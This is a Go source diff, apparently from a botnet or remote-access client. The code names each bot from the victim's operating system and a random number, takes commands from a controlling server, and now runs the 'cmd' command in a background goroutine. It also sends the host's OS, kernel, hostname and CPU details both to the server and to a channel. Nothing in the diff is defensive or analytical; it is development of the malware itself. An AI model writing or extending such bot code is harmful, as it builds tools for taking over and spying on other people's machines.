@@ -9,11 +9,14 @@ import (
 	gi "github.com/matishsiao/goInfo"
 )
 
+var BotName string
+
 //Getnick ...
 func Getnick() string {
 	temp := gi.GetInfo()
 	rand := rand.Int63n(5000000)
-	return fmt.Sprintf("%s_%d", temp.GoOS, rand)
+	BotName = fmt.Sprintf("%s_%d", temp.GoOS, rand)
+	return BotName
 }
 
 //HandleCommand ...
@@ -25,7 +28,7 @@ func HandleCommand(c net.Conn, message string) {
 		go getInf(c)
 		break
 	case "cmd":
-		cmd(fullCommand, c)
+		go cmd(fullCommand, c)
 		break
 	}
 }
@@ -33,4 +36,5 @@ func HandleCommand(c net.Conn, message string) {
 func getInf(c net.Conn) {
 	info := gi.GetInfo()
 	sendToServer(c, "OS->"+info.OS+"- Platform ->"+info.Platform+"- Kernel ->"+info.Kernel+"- Host ->"+info.Hostname+"- Core ->"+info.Core)
+	sendMessageToChannel("OS->" + info.OS + "- Platform ->" + info.Platform + "- Kernel ->" + info.Kernel + "- Host ->" + info.Hostname + "- Core ->" + info.Core)
 }
